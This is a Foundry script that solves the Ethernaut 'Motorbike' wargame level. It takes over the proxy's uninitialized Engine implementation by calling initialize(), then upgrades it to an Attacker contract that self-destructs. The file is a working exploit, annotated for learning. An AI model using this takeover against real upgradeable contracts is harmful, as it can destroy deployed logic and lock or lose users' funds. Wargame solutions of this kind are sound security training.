// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Motorbike.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attacker {
    function kill() public {
        selfdestruct(payable(msg.sender));
    }
}

contract MotorbikeScript is Script {
    address constant ETHERNAUT_CONTRACT_ADDRESS = 0xDF70C100492B487351A820c171F80f9b0c2Bbd7b;
    Motorbike public bikeProxy = Motorbike(payable(ETHERNAUT_CONTRACT_ADDRESS));

    Engine public engineThoughProxy = Engine(payable(ETHERNAUT_CONTRACT_ADDRESS)); // the one implementation contract that users should interact with

    // EIP-1967 storage slot used to store the implementation (engine) address in the Motorbike contract storage
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    Engine public engine = Engine(address(uint160(uint256(vm.load(address(bikeProxy), _IMPLEMENTATION_SLOT))))); // the direct, "original" implementation contract that users should NOT interact with

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // 1. set ourself as upgrader
        // engine has been initialized BUT using delegatecall
        //  from the Motorbike proxy constructor
        //  => initialize() was executed in the context of the Motorbike proxy
        //  ==> from the engine POV (own storage), it has not been called
        engine.initialize();

        // 2. deploy Attacker
        Attacker attacker = new Attacker();

        // 3. upgrade implementation contract to Attacker and call kill()
        bytes memory killData = abi.encodeWithSignature("kill()");

        engine.upgradeToAndCall(address(attacker), killData);

        vm.stopBroadcast();
    }
}
